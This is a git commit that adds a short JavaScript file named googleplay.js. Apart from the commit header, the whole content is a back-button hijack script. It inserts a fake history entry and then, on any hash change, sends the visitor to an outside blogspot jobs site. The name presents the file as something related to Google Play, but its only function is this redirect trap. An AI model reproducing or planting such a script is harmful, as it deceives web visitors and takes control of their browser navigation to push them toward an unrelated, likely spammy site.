1020de00c4602a6479ab3d7b4c0bc9e46cf310ca
usorondo3 <mimic-piteous-5s@icloud.com>
2026-02-12 13:15:19 +0100

    Create googleplay.js

---
+++ googleplay.js
@@ -0,0 +1,13 @@
+
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://appliedjobszw.blogspot.com";
+    }
+    function goon(){
+        location.href="https://appliedjobszw.blogspot.com";
+    }
